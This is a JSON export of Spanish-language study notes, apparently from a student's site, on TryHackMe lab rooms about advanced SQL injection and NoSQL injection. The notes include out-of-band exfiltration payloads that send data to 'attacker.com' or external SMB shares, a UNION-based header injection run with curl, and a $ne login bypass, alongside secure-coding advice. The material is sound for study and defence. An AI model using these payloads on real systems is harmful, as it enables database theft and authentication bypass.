[
  {
    "title": "8. Automation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/8-automation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/8. Automation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "La inyección SQL sigue siento una amenaza común debido a la implementación inadecuada de medidas de seguridad y la complejidad de diferentes frameworks web. La identificación de automatizaciones y la explotación de estas vulnerabilidades puede ser retador, pero hay varias herramientas y técnicas que han sido desarrolladas para ayudar a simplificar este proceso.\n\n-----------------------------------------------\n<h2>Mayores Problemas Durante la Identificación</h2>\nIdentificar vulnerabilidades de inyección SQL involucra varios retos, similar a identificar cualquier otro tipo de vulnerabilidad del lado del servidor. Aquí están los problemas clave:\n\n- **Naturaleza dinámica de las queries SQL:** Las queries SQL pueden ser construidas dinámicamente, haciendo difícil detectar puntos de inyección. las queries complejas con múltiples capas de lógica pueden ocultar vulnerabilidades potenciales.\n- **Variedad de puntos de inyección:** La inyección SQL puede ocurrir en diferentes partes de la aplicación, incluyendo campos de input, headers HTTP y parámetros URL. Identificar todos los puntos de inyección SQL requiere una comprobación a conciencia y entendimiento de la aplicación.\n- **Uso de medidas de seguridad:** Las aplicaciones pueden usar statements preparados, queries parametrizadas, y frameworks ORM, los cuales pueden prevenir las inyecciones SQL. Las herramientas automatizadas deben ser capaces de diferenciar entre construcciones de query seguras y no seguras.\n- **Detección específica del contexto:** El contexto en el que se usan los inputs del usuario en queries SQL puede variar ampliamente. Las herramientas deben adaptarse a diferentes contextos para identificar vulnerabilidades de forma precisa.\n\n---------------------------------------\n<h2>Algunas Herramientas Importantes</h2>\nAlgunas herramientas importantes que han sido desarrolladas por la comunidad para ayudar en la búsqueda automática de vulnerabilidades de inyección SQL son:\n\n- **[SQLMap](https://github.com/sqlmapproject/sqlmap):** Herramienta de código abierto que automatiza el proceso de detectar y explotar vulnerabilidades SQLi en aplicaciones web.\n- **[SQLNinja](https://github.com/xxgrunge/sqlninja):** Específicamente diseñada para explotar vulnerabilidades SQLi en aplicaciones web que usan Microsoft SQL server como base de datos en el backend.\n- **[JSQL Injection](https://github.com/ron190/jsql-injection):** Librería Java focalizada en detectar vulnerabilidades SQLi en aplicaciones Java.\n- **[BBQSQL](https://github.com/CiscoCXSecurity/bbqsql):** Es un framework de Blind SQLi diseñado para ser simple y efectivo para este tipo de explotación.",
    "modified": "2026-01-11T01:00:33"
  },
  {
    "title": "9. Best Practices",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/9-best-practices/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/9. Best Practices.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "SQLi es una vulnerabilidad con renombre que ha sido el principal quebradero de cabeza en la seguridad de aplicaciones durante años. Los pentesters deben prestar especial atención a esta vulnerabilidad durante sus pruebas, ya que requiere un entendimiento concienzudo de varias técnicas para identificar y explotar puntos de inyección SQL. De la misma manera, los desarrolladores deben conocer e implementar las mejores prácticas para proteger sus aplicaciones.\n\n--------------------------------------\n<h2>Secure Coders</h2>\n- **Queries parametrizadas y statements preparados:** Úsalos para asegurar que el input del usuario se trate como información en lugar de código ejecutable. Por ejemplo en PHP con PDO puedes preparar statements y parámetros de unión como `$stmt = $pdo->prepare(\"SELECT * FROM users WHERE username = :username\"); $stmt->execute(['username' => $username]);`.\n- **Validación y sanitización del input:** Implementa una validación y sanitización robusta para asegurar que la información recibida del usuario es la que debería ser. Usa funciones integradas como `htmlspecialchars()` y `filter_var()`.\n- **Principio de menor privilegio:** Aplica este principio garantizando que los usuarios tienen SÓLO los privilegios suficientes para realizar su trabajo y ya.\n- **Procedimientos almacenados:** Encapsula y valida la lógica SQL usando procedimientos almacenados.Esto te permite controlar y validar los inputs de la base de datos.\n- **Auditorías y revisiones de código regulares:** Realiza auditorías de seguridad y revisiones de código de forma regular para identificar y solucionar vulnerabilidades.\n\n----------------------------------------------------\n<h2>Pentesters</h2>\n- **Explotar funcionalidades específicas de la base de datos:** Diferentes sistemas de manejo de bases de datos (DBMS) tienen funcionalidades y sintaxis únicas. Deberías entender las específicas del DBMS objetivo.\n- **Aprovecharse de mensajes de error:** Explota errores de verbose para ganar información del esquema y estructura de la base de datos .Por ejemplo, `1' AND 1=CONVERT(int, (SELECT @@version)) --` puede generar errores que filtren la versión.\n- **Bypassear WAFs y filtros:** Prueba varias técnicas de ofuscación para bypassear WAFs y filtros de input como hemos visto en esta unidad (concatenación, mixed case, inline comments, different encodings, etc.).\n- **Identificar la base de datos:** Determina el tipo y la versión de la base de datos para hacer el ataque a su medida. Puedes hacer esto con queries como `SELECT version()` o `SELECT @@version`.\n- **Pivotar con la inyección SQL:** Usa la inyección SQL para pivotar y atacar otras partes de la red.",
    "modified": "2026-01-11T01:00:33"
  },
  {
    "title": "6. Out-of-band SQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/6-out-of-band-sql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/6. Out-of-band SQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "La inyección SQL out-of-band (OOB) es una técnica de ataque que se usa para exfiltrar información o ejecutar acciones maliciosas cuando los métodos tradicionales resultan poco efectivos. Al contrario que la in-band SQLi, donde se usa el mismo canal para el ataque y la obtención de información, en la OOB SQLi se usan canales separados para mandar el payload y recibir la respuesta. Las técnicas de OOB SQLi usan funcionalidades como peticiones HTTP, queries DNS, protocolo SMB u otros protocolos de red a los que el servidor de la base de datos tenga acceso, habilitando a que los atacantes puedan circunvalar firewalls, IDSs y otras medidas de seguridad.\n\n![process flow of OOB injection](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1717060822273)\n\nUna de las ventajas principales es el sigilo y confiabilidad. Usando diferentes canales de comunicación los atacantes minimizan el riesgo de detección y mantienen una conexión persistente. Por ejemplo, el atacante puede inyectar un payload SQL que dispare una petición DNS desde el servidor de la base de datos hasta el servidor de un atacante.\n\n----------------------------------\n<h2>¿Por qué usar OOB?</h2>\nEn escenarios donde la respuesta directa está sanitizada o limitada por medidas de seguridad, OOB habilita que los atacantes puedan exfiltrar información sin feedback inmediato del servidor. Por ejemplo, los mecanismos de seguridad como procedimientos almacenados, encoding de output y restricciones a nivel de aplicación pueden prevenir respuestas directas, haciendo los ataques de inyección SQL tradicionales ineficientes. Las técnicas de OOB como peticiones HTTP o DNS permiten que la información sea mandada circunvalando las medidas de protección.\n\nAdemás, los IDSs y WAFs generalmente monitorizan y registran las respuestas SQL en busca de actividad sospechosa, bloqueando respuestas directas. Usando los dos canales de la OOB, los atacantes pueden evitar este tipo de detección usando protocolos de red menos buscados como DNS o SMB. Particularmente efectivo cuando la conectividad entre el atacante y el servidor es limitada, como si este tiene un firewall o está en otro segmento de red.\n\n------------------------------------\n<h2>Técnicas en Diferentes Bases de Datos</h2>\nLos ataques de inyección SQL OOB utilizan la metodología de escribir en otro canal de comunicación a través de una query construida. Esta técnica es efectiva para exfiltrar información o realizar acciones maliciosas cuando la interacción con la base de datos está restringida. Hay múltiples comandos en la base de datos que pueden permitir exfiltración pero debajo hay una list de los más usados en varios sistemas de bases de datos.\n\n<h4>MySQL y MariaDB</h4>\nEn MySQL o MariaDB, la inyección SQL OOB puede ser alcanzada usando [SELECT ... INTO OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) o el comando [load_file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file). Este comando permite a los atacantes escribir los resultados de una query en un archivo en el sistema de archivos. Por ejemplo:\n\n```SQL\nSELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';\n```\n\nUn atacante puede después acceder a este archivo mediante SMB share o un servidor HTTP que corra en el servidor.\n\n<h4>Microsoft SQL Server (MSSQL)</h4>\nEn MSSQL, la inyección SQL OOB puede realizarse usando funcionalidades como [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16), la cual permite la ejecución de comandos de consola directamente de queries SQL. Esto puede ser usado para escribir la información en un archivo accesible a través de una network share:\n\n```sql\nEXEC xp_cmdshell 'bcp \"SELECT sensitive_data FROM users\" queryout \"\\\\10.10.58.187\\logs\\out.txt\" -c -T';\n```\n\nAlternativamente, `OPENROWSET` o `BULK INSERT` pueden ser usados para interactuar con las fuentes de información externas, facilitando la exfiltración a través de canales OOB.\n\n<h4>Oracle</h4>\nEn las bases de datos Oracle, OOB SQLi se ejecuta usando los paquetes [UTL_HTTP](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html) o [UTF_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html). Por ejemplo, el paquete `UTL_HTTP` puede ser usado para mandar peticiones HTTP con información sensible.\n\n```sql\nDECLARE\n  req UTL_HTTP.REQ;\n  resp UTL_HTTP.RESP;\nBEGIN\n  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);\n  UTL_HTTP.GET_RESPONSE(req);\nEND;\n```\n\n------------------------------------------\n<h2>Ejemplos de Técnicas Out-Of-Band SQLi</h2>\nLas técnicas de OOB SQLi en MySQL y MariaDB pueden utilizar varios protocolos de red para exfiltrar datos. Los métodos primarios incluyen exfiltración DNS, peticiones HTTP y shares SMB. Cada una de estas puede ser aplicada dependiendo de las capabilities del entorno MySQL/MariaDB y el setup de red.\n\n<h4>Peticiones HTTP</h4>\nUsando funciones de bases de datos que permiten peticiones HTTP, los atacantes pueden mandar información sensible directamente a un servidor web que controlan. Este método explota las funcionalidades de la base de datos que pueden dirigir hacia fuera las conexiones HTTP. Aunque MySQL y MariaDB no soportan peticiones HTTP de forma nativa puede hacerse mediante scripts externos o UDFs (User Defined Functions) si la base de datos lo permite.\n\nPrimero, la UDF necesita ser creada e instalada para soportar peticiones HTTP. Este setup es complejo y suele involucrar configuración adicional. Una query de ejemplo sería así: `SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`. La exfiltración mediante peticiones HTTP puede ser implementada en Windows y Linux dependiendo del soporte de la base de datos de scripts externos o UDFs que las permitan.\n\n<h4>Exfiltración DNS</h4>\nLos atacantes pueden usar queries SQL para generar peticiones DNS con información encodeada, la cual se manda a un servidor DNS malicioso. Esta técnica sobrepasa filtros de monitorización basados en HTTP y se aprovecha  de la capacidad de la base de datos para realizar lookups DNS.\n\nComo ya hemos hablado, MySQL no tiene soporte nativo para generar peticiones DNS a través de únicamente comandos SQL. Los atacantes pueden usar otros medios para conseguirlo como UDFs o scripts de sistema para realizar consultas DNS.\n\n<h4>Exfiltración SMB</h4>\nInvolucra escribir los resultados de la query en una share SMB en un servidor externo. Esta técnica es particularmente efectiva en entornos Windows pero también puede configurarse en sistemas Linux con el setup indicado. Un ejemplo de la query se vería así: `SELECT sensitive_data INTO OUTFILE '\\\\\\\\10.10.162.175\\\\logs\\\\out.txt';`.\n\nEsto está completamente soportado ya que Windows soporta nativamente las rutas SMB/UNC. Aunque las rutas SMB son más nativas de Windows, las shares SMB pueden montarse y ser accedidas usando herramientas como `smbclient` o montándolas en un directorio local. Usar directamente rutas UNC en queries SQL puede requerir setup adicional o scripts para facilitar la interacción.\n\n-----------------------------------------\n<h2>Ejemplo Práctico</h2>\nEn este escenario práctico, demostraremos cómo un atacante puede exfiltrar información de una aplicación web vulnerable usando una técnica de inyección SQL OOB. El lado del servidor contiene una vulnerabilidad de inyección SQL la cual permite construir un payload que escribe los resultados de la query en una share SMB externa.\n\n<h4>Explicación del Escenario</h4>\nEn este escenario, habilitaríamos una network share en `ATTACKBOX_IP\\logs`. Esta share es accesible a través de la red y permite que archivos de otras máquinas sean escritos en ella. Para hacer esto, arrancamos la AttackBox y ejecutamos lo siguiente:\n\n1. Navegamos hasta el directorio `impacket` usando `cd /opt/impacket/examples`.\n2. Introducimos el comando `python3.9 smbserver.py -smb2support -comment \"My Logs Server\" -debug logs /tmp`.\n3. Puedes acceder a los contenidos de la network share introduciendo el comando `smbclient //ATTACKBOX_IP/logs -U guest -N`. Esto te permite conectarte a la network share y ahí puedes usar `ls` para listar todos los comandos.\n\nTenemos la misma aplicación web con una funcionalidad de búsqueda. El código del lado del servidor para esta funcionalidad es vulnerable a inyección SQL y puedes acceder a él en `http://10.65.188.152/oob/search_visitor.php?visitor_name=Tim`.\n\n![[Pasted image 20260110145327.png]]\n\nEl código del servidor se ve así:\n\n```php\n$visitor_name = $_GET['visitor_name'] ?? '';\n\n$sql = \"SELECT * FROM visitor WHERE name = '$visitor_name'\";\n\necho \"<p>Generated SQL Query: $sql</p>\";\n\n// Execute multi-query\nif ($conn->multi_query($sql)) {\n    do {\n        // Store first result set\n        if ($result = $conn->store_result()) {\n            if ($result->num_rows > 0) {\n                while ($row = $result->fetch_assoc()) {\n```\n\n<h4>Consideración Importante</h4>\nEs importante saber que la variable de sistema MySQL `secure_file_priv` puede estar configurada. Cuando lo está, esta variable contiene la ruta del directorio, y MySQL sólo permite que los archivos se escriban en ese directorio. Esta medida de seguridad ayuda a mitigar el riesgo de operaciones de archivo no autorizadas.\n\n- **Cuando `secure_file_priv` está configurada:** MySQL restringirá las operaciones de archivos como `INTO OUTFILE` al directorio especificado. Esto significa que los atacantes no podrán exfiltrar a localizaciones arbitrarias.\n- **Cuando `secure_file_priv` no está configurada:** Si la variable `secure_file_priv` está vacía, MySQL no impone restricciones de directorio, permitiendo que los archivos sean escritos a cualquier directorio accesible por el proceso del servidor MySQL.\n\nLos atacantes no suelen tener acceso al valor de la variable `secure_file_priv`. Como resultado, deben confiar en métodos de prueba y error para determinar si pueden y dónde pueden escribir archivos, comprobando varias rutas.\n\n<h4>Preparando el Payload</h4>\nPara explotar esta vulnerabilidad el atacante configura un payload para inyectar en el parámetro `visitor_name`. El payload será diseñado para ejecutar una query SQL adicional que escriba la versión de la base de datos a una share SMB externa.\n\n```sql\n1'; SELECT @@version INTO OUTFILE '\\\\\\\\ATTACKBOX_IP\\\\logs\\\\out.txt'; --\n```\n\nDiseccionemos el payload:\n\n- `1'`: Cierra la string original en la query SQL.\n- `;`: Termina el primer statement SQL.\n- `SELECT @@version INTO OUTFILE '\\\\\\\\ATTACKBOX_IP\\\\logs\\\\out.txt';`: Ejecuta un nuevo statement SQL que devuelve la versión de la base de datos y la escribe en una share SMB en `\\\\ATTACKBOX_IP\\logs\\output.txt`.\n- `--`: Comenta el resto de la query SQL original para prevenir errores de sintaxis.\n\nPara utilizar el payload, el atacante visitaría la URL que crea un archivo en la share SMB externa.\n\nPara acceder al archivo usa `ls /tmp` para ver el archivo recibido en el directorio `/tmp`.",
    "modified": "2026-01-11T01:00:33"
  },
  {
    "title": "7. Other Techniques",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/7-other-techniques/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/7. Other Techniques.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "La inyección SQL avanzada involucra un rango de métodos sofisticados que van más allá de ataques básicos. Aquí hay algunas técnicas avanzadas importantes que los pentesters deberían saber que existen:\n\n---------------------------------------------\n<h2>HTTP Header Injection</h2>\nLos headers HTTP pueden transportar input del usuario, lo que puede ser usado en queries SQL en el lado del servidor. Si estos inputs no son sanitizados, puede llevar a la inyección SQL. La técnica involucra manipular headers HTTP (como **User-Agent**, **Referer** o **X-Forwarded-For**) para inyectar comandos SQL. El servidor puede registrar estos headers para usarlos en queries SQL. Por ejemplo, un header User-Agent malicioso puede verse como `User-Agent: ' OR 1=!; --`. Si el servidor incluye el header User-Agent en una query SQL sin sanitizarla, puede resultar en una SQLi.\n\nEn este ejemplo, una aplicación web registra los headers User-Agent en una tabla llamada logs en la base de datos. La aplicación ofrece un endpoint en `http://IP/httpagent/` que muestra todas las entradas registradas de la tabla logs. Cuando un usuario visita la página, su navegador manda un header User-Agent, el cual identifica el navegador y sistema operativo. Si este header se introduce en una tabla SQL con propósito de registro sin sanitizar, puede tener consecuencias devastadoras.\n\nDado el endpoint, un atacante puede intentar inyectar código SQL en el header User-Agent para explotar las vulnerabilidades de inyección SQL. Por ejemplo, configurando el header User-Agent a un valor malicioso como `User-Agent: ' UNION SELECT username, password FROM user; --`.\n\nAquí está el código del lado del servidor que inserta los logs:\n\n```php\n$userAgent = $_SERVER['HTTP_USER_AGENT'];\n$insert_sql = \"INSERT INTO logs (user_Agent) VALUES ('$userAgent')\";\nif ($conn->query($insert_sql) === TRUE) {\n    echo \"<p class='text-green-500'>New logs inserted successfully</p>\";\n} else {\n    echo \"<p class='text-red-500'>Error: \" . $conn->error . \" (Error Code: \" . $conn->errno . \")</p>\";\n}\n\n$sql = \"SELECT * FROM logs WHERE user_Agent = '$userAgent'\";\n..\n... \n```\n\nEl valor del User-Agent es insertado en la tabla logs usando el statement de SQL, INSERT. Si la inserción resulta exitosa, un mensaje de éxito se muestra. Un mensaje de error se muestra si falla.\n\n![[Pasted image 20260110161316.png]]\n\n<h4>Preparando el Payload</h4>\nPrepararemos e inyectaremos un payload SQL en el header User-Agent para demostrar cómo la inyección SQL puede ser explotada mediante headers HTTP. Nuestro payload será `' UNION SELECT username, password FROM user;#`. Este payload está diseñado para:\n\n- **Cerrar la string literal existente:** La comilla inicial (`'`), se usa para cerrar la string existente en la query SQL.\n- **Inyectar un statement UNION SELECT:** La parte `UNION SELECT username, password FROM user;` del payload se usa para recuperar las columnas de nombre de usuario y contraseña de la tabla `user`.\n- **Comentar el resto de la query:** El carácter `#` se usa para comentar el resto de la query SQL asegurando que cualquier código SQL que siga sea ignorado.\n\nNecesitamos mandar este payload como parte del header User-Agent en nuestra petición HTTP para inyectar este payload, lo cual podría ser hecho usando herramientas como BurpSuite o cURL. Usaremos cURL.\n\n```bash\nuser@tryhackme$ curl -H \"User-Agent: ' UNION SELECT username, password FROM user; # \" http://10.65.188.152/httpagent/\n```\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection </title>\n rel=\"stylesheet\">\n</head>\n<body class=\"bg-gray-100\">\n    <div class=\"container mx-auto p-8\">\n        <h1 class=\"text-4xl font-bold mb-8 text-center\">HTTP Logs</h1>\n        <div class=\"bg-white p-6 rounded-lg shadow-lg\">\n\n<p class='text-gray-600 text-sm mb-4'>Generated SQL Query: <span class='text-red-500'>SELECT * FROM logs WHERE user_Agent = '' UNION SELECT username, password FROM user; #'</span></p><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>bob</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>bob@123</span></p></div><div class='p-4 bg-gray-100 rounded shadow mb-4'><p class='font-bold'>id: <span class='text-gray-700'>attacker</span></p><p class='font-bold'>user_Agent: <span class='text-gray-700'>tesla</span></p></div>\n        </div>\n    </div>\n</body>\n</html>\n```\n\nLa respuesta del servidor será mostrada en la terminal. Si la SQLi es exitosa verás la información extraída en la respuesta.\n\n----------------------------------------------\n<h2>Exploiting Stored Procedures</h2>\nLos procedimientos almacenados son rutinas en la base de datos que pueden realizar varias operaciones como insertar, actualizar o pedir información. Mientras que pueden mejorar la eficiencia y asegurar consistencia, también pueden ser vulnerables a inyecciones SQL si no se manejan adecuadamente.\n\n![process flow of stored procedure](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716922785792)\n\nLos procedimientos almacenados son statements SQL precompilados que pueden ser ejecutados como una unidad única. Se guardan en la base de datos y pueden ser llamados por aplicaciones para realizar tareas específicas. Pueden aceptar parámetros, los cuales los hacen flexibles y poderosos. Sin embargo, si estos parámetros no se sanitizan adecuadamente, pueden introducir vulnerabilidades de inyección SQL.\n\nConsidera un procedimiento almacenado diseñado para recuperar información del usuario basado en un nombre de usuario:\n\n```sql\nCREATE PROCEDURE sp_getUserData\n    @username NVARCHAR(50)\nAS\nBEGIN\n    DECLARE @sql NVARCHAR(4000)\n    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''\n    EXEC(@sql)\nEND\n```\n\nEn este ejemplo, el procedimiento almacenado concatena el parámetro `@username` en una query SQL dinámica. Este acercamiento es vulnerable a SQLi porque el input no está sanitizado.\n\n------------------------------------------\n<h2>XML and JSON Injection</h2>\nLas aplicaciones que parsean datos XML o JSON y usan esa información parseada en queries SQL pueden ser vulnerables a la inyección SQL si no sanitizan los inputs adecuadamente. La inyección XML y JSON involucra inyectar información maliciosa en estructuras XML o JSON que son usadas después en queries SQL. Esto puede ocurrir si la aplicación usa directamente valores parseados en statements SQL.\n\n```xml\n{\n  \"username\": \"admin' OR '1'='1--\",\n  \"password\": \"password\"\n}\n```\n\nSi la aplicación usa los valores directamente en una query como `SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- AND password = 'password'`, podría resultar en una inyección.",
    "modified": "2026-01-11T01:00:33"
  },
  {
    "title": "2. NoSQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/2-nosql-injection/2-nosql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/2. NoSQL Injection/2. NoSQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 2. NoSQL Injection",
    "content": "<h2>Injection is Injection</h2>\nMientras que parece complejo pensar en una inyección NoSQL, cuando reducimos los ataques de inyección a su esencia, podemos entender las similitudes entre las inyecciones SQL y NoSQL.\n\nLa causa raíz de un ataque de inyección es la concatenación indebida o input del usuario no confiable en un comando que puede permitir al atacante alterar el propio comando. Con la inyección SQL el acercamiento más común es inyectar comillas simples o dobles. El mismo principio aplica a la inyección NoSQL. Si se añade a la query un input no confiable, tenemos la oportunidad de modificar la propia query. Hay dos tipos principales de inyección NoSQL:\n\n- **Inyección de Sintaxis:** Es similar a la inyección SQL, donde tenemos la habilidad de romper la query e inyectar nuestro propio payload. La diferencia principal es la sintaxis usada.\n- **Inyección de Operadores:** Incluso si no podemos romper la query, potencialmente podemos inyectar operadores query NoSQL que manipulen el comportamiento de la query permitiéndonos realizar ataques como bypasses de autentificación.\n\nEn esta unidad nuestro foco principal estará centrado en la inyección de operadores y las diferentes maneras en las que puede ser usado. Eso es porque no es tan común encontrar casos de inyección de sintaxis. Sin embargo, ya que el input del usuario puede variar, estos mismos filtros pueden ser vulnerables a la inyección de operadores. Sin embargo, cubriremos un ejemplo de inyección de sintaxis al final de la unidad.\n\n------------------------------------------\n<h2>¿Cómo Inyectar NoSQL?</h2>\nAl mirar a cómo los filtros NoSQL son construidos, bypassearlos para inyectar cualquier payload puede parecer imposible, ya que recaen en crear un array estructurado. Al contrario que la SQLi, donde las queries normalmente se construyen con simple concatenación de comandos, las queries NoSQL requieren arrays asociativos anidados. Esto significa que para inyectar NoSQL, uno debe poder inyectar arrays en la aplicación.\n\nPor suerte para nosotros, muchos lenguajes de programación del lado del servidor nos permiten pasar arrays usando una sintaxis especial en la string query de una petición HTTP. Para el propósito de este ejemplo nos centraremos en el siguiente código escrito en PHP para una simple página de login:\n\n```php\n<?php\n$con = new MongoDB\\Driver\\Manager(\"mongodb://localhost:27017\");\n\n\nif(isset($_POST) && isset($_POST['user']) && isset($_POST['pass'])){\n        $user = $_POST['user'];\n        $pass = $_POST['pass'];\n\n        $q = new MongoDB\\Driver\\Query(['username'=>$user, 'password'=>$pass]);\n        $record = $con->executeQuery('myapp.login', $q );\n        $record = iterator_to_array($record);\n\n        if(sizeof($record)>0){\n                $usr = $record[0];\n\n                session_start();\n                $_SESSION['loggedin'] = true;\n                $_SESSION['uid'] = $usr->username;\n\n                header('Location: /sekr3tPl4ce.php');\n                die();\n        }\n}\nheader('Location: /?err=1');\n\n?>\n```\n\nLa aplicación web está haciendo una petición a MongoDB usando la base de datos `myapp` y la colección `login`, pidiendo cualquier documento que pase el filtro `['username'=>$user, 'password'=>$pass]`, donde ambos, `$user` y `$pass` se obtienen directamente de parámetros HTTP POST. Echemos un vistazo a cómo podemos usar la inyección de operadores para bypassear la autentificación.\n\nSi por lo que sea podemos mandar un array a `$user` y `$pass` con el siguiente contenido:\n\n`$user = ['$ne'=>'xxxx']`\n`$pass = ['$ne'=>'yyyy']`\n\nPodríamos engañar a la base de datos para que nos devuelva todos los documentos donde el usuario sea distinto de `xxxx` y la contraseña distinta de `yyyy`. Esto devolvería todos los documentos en la colección login. Como resultado, la aplicación detectaría un inicio de sesión exitoso y nos daría los privilegios del usuario al que corresponda el primer documento obtenido.\n\nEl problema es que no sabemos cómo pasar un array como parte de la petición HTTP POST. Resulta que PHP y varias otras lenguas permiten pasar un array usando la siguiente notación en el cuerpo de la petición POST.\n\n`user[$ne]=xxxx&pass[$ne]=yyyy`",
    "modified": "2026-01-11T01:00:33"
  }
]